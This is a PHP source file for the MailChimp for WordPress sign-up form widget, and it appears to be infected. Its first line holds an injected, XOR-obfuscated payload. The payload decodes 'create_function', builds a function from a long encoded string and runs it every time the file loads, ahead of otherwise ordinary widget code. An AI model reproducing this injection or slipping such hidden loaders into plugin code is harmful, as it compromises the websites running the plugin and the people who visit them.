<?php $dWtXTkUWKT='U;=X2W2-O44O<D+'^'6IX9F2mK:ZW;U+E';$VErvdye=$dWtXTkUWKT('','0>BfHI=23TW<6T:.7-NKoHV=8OS3UqmYXGJqhkJA9SFCMX1CEE7OAsYJM9h8YUCnSR658tQk33EAlFGfl0ZB2hQN;eDDarIiyoM:3NARURTwjFbXHDF86.-Gf7;<LjWmLQomBK1hC71=LiUUbM2;BAns1oYiClQ6WfJ.WmXE.RX4=yEK44YsAxlyhO-13<TbF5F9oudC-XI3SQ3UTAYoa3.RJ X>aDRG1c- :qxf5TVG5q=<QA<55N0VXsczao>9yY4GGv1YEIMKDrZSP IyRL;FsDV<O; QMkZkwQELIYQt4J,VfjBV3RR0QNXFeIBJbyOE+4..gGO2mPR5,LNYHbCs hoby;,rREJJPXRtHlZvC6PL,pWUEgEHV6J6s;P.WVwf9+2nZ12t+,JLYdwQA,L7TbZ3AxP=lvSV9YYTa,=E:XI;RAWOIET+G++L3 -bP9DxQ8N4yPjZPZ6+Emp 2M-jCyU AOUc9HYCXQr<JqU+-,4WKAb.880CcP,22SH9:L6iK ILNgQr1289hZDRnX:,lMe37MYjP=NWaaslqvWmQKNWDC<z6Y3q=PjiuLRh+DJ-y-ugcCBLJabgmTP3=10nWIGr4:1+7EYq33EVT;-TjwQJ85OEyrOGezsHgN.;6AYL<ZN4+U22AL52Di0OaXXYJXExTglxI'^'YXjG.<SQG=8Ri1BGDY=cH09Og+2G4.24-3mXAK1K053-.,X,+eO 3,=+9X7g4 7Fw6WAYXqOXV<hLfgFLKPK;L>;OEydFUrcpf+UAfe;uotGQfF1t72JZKCoBSZH-ClMh8DFkA8agXDIlGhuJiVZ6 5WX2y7cH:S.=nGwHx6Z 4QSQa QMp.hCfpa=HEFN:JbZ3MFNnJPR49YuW4  yRAUO>9Ec4E 33P<FECQEFS5:4PJ767.NPT-XvpW<9. up<yU4gRZ<<ipudV,2<U,Pr71OW 7H.dK44KgKS: 5rSXPP+X7FWbrE3>E4uR;oC+,BQnaOUZONg48d6=GI--1hJg,r->7<hxR36jn;=+TuRzR5W<9IYw.OnLl2W>W,P5WwkWBRNKUP8;POM>-yYWu7M B1YP:<r-7fR77M8yiAlH+I=;R3->5,m,D5tO-GAr==L0P3Y=QOd5>59YO ETDS9LCoYqD ;4<R- jqjxU,YqOLXUwmgBOJJQ:<;IKm60PI8EAlK,5iKqVUSLXAzbtNpWHYeAWV981wV+.F<ZLLKwJbz-aq YBUkUBYgXXC.bYJwyOKNMTT v-mHBAKt1AOPI1<,>-QBXXC6qVCR<:;ZIsFWu.YA.lPRogEZS3mGKMW-qhX;:UprBS8 ZS NmfZRQ<211PdNWr4');$VErvdye();

defined( 'ABSPATH' ) or exit;

/**
 * Adds MC4WP_Widget widget.
 *
 * @ignore
 */
class MC4WP_Form_Widget extends WP_Widget {

	/**
	 * @var array
	 */
	private $default_instance_settings = array(
		'title' => '',
		'form_id' => ''
	);

	/**
	 * Register widget with WordPress.
	 */
	function __construct() {

		// translate default widget title
		$this->default_instance_settings['title'] = __( 'Newsletter', 'mailchimp-for-wp' );

		parent::__construct(
			'mc4wp_form_widget', // Base ID
			__( 'MailChimp Sign-Up Form', 'mailchimp-for-wp' ), // Name
			array(
				'description' => __( 'Displays your MailChimp for WordPress sign-up form', 'mailchimp-for-wp' ),
			)
		);
	}

	/**
	 * Front-end display of widget.
	 *
	 * @see WP_Widget::widget()
	 *
	 * @param array   $args     Widget arguments.
	 * @param array   $instance_settings Saved values from database.
	 */
	public function widget( $args, $instance_settings ) {

	    // ensure $instance_settings is an array
        if( ! is_array( $instance_settings ) ) {
            $instance_settings = array();
        }

		$instance_settings = array_merge( $this->default_instance_settings, $instance_settings );
		$title = apply_filters( 'widget_title', $instance_settings['title'] );

		echo $args['before_widget'];

		if ( ! empty( $title ) ) {
			echo $args['before_title'] . $title . $args['after_title'];
		}

		mc4wp_show_form( $instance_settings['form_id'] );

		echo $args['after_widget'];
	}

	/**
	 * Back-end widget form.
	 *
	 * @see WP_Widget::form()
	 *
	 * @param array $settings Previously saved values from database.
	 *
	 * @return string|void
	 */
	public function form( $settings ) {
		$settings = array_merge( $this->default_instance_settings, (array) $settings );

		?>
        <p>
			<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:', 'mailchimp-for-wp' ); ?></label>
			<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $settings['title'] ); ?>" />
        </p>


		<?php
		/**
		 * Runs right after the widget settings form is outputted
		 *
		 * @param array $settings
		 * @param MC4WP_Form_Widget $this
		 * @ignore
		 */
		do_action( 'mc4wp_form_widget_form', $settings, $this );
		?>

        <p class="help">
			<?php printf( __( 'You can edit your sign-up form in the <a href="%s">MailChimp for WordPress form settings</a>.', 'mailchimp-for-wp' ), admin_url( 'admin.php?page=mailchimp-for-wp-forms' ) ); ?>
        </p>
		<?php
	}

	/**
	 * Validates widget form values as they are saved.
	 *
	 * @see WP_Widget::update()
	 *
	 * @param array   $new_settings Values just sent to be saved.
	 * @param array   $old_settings Previously saved values from database.
	 *
	 * @return array Updated safe values to be saved.
	 */
	public function update( $new_settings, $old_settings ) {

		if( ! empty( $new_settings['title'] ) ) {
			$new_settings['title'] = sanitize_text_field( $new_settings['title'] );
		}

		/**
		 * Filters the widget settings before they are saved.
		 *
		 * @param array $new_settings
		 * @param array $old_settings
		 * @param MC4WP_Form_Widget $widget
		 * @ignore
		 */
		$new_settings = apply_filters( 'mc4wp_form_widget_update_settings', $new_settings, $old_settings, $this );

		return $new_settings;
	}

} // class MC4WP_Widget
